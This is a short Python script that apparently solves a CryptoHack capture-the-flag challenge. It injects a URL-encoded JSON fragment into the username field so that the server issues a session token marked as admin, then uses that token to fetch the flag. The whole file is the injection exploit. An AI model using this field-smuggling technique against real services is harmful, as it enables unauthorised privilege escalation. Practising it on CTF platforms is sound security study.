import requests
import json

# Endpoint for the challenge
URL = "http://web.cryptohack.org/json-in-json/"
SECRET_KEY = "secret"

def create_session(username):
    return URL + f"create_session/{username}/"

def authorise(token):
    return URL + f"authorise/{token}/"

# Generate malicious token using JSON injection
params = "user%22%2C%20%22admin%22%3A%20%22True"
response = requests.get(create_session(params))

# Check if response contains valid JSON
try:
    response_json = response.json()
    token = response_json.get("session")
    if token:
        # Retrieve flag using token
        flag_response = requests.get(authorise(token))
        print(flag_response.content.decode("utf-8"))
    else:
        print("No 'session' key in response.")
except ValueError:
    print("Response is not valid JSON.")
    print("Response content:", response.text)


